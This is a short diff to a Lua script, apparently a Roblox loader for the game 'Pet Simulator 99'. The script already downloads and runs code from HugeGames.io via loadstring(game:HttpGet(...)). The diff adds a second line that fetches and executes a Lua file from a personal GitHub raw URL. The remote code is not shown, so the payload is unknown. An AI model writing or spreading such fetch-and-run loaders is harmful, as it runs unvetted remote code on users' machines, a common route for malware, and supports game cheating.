@@ -108,5 +108,5 @@ until gameLoaded()
 
 -- Load the external script
 loadstring(game:HttpGet("https://HugeGames.io/ps99"))()
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
 end
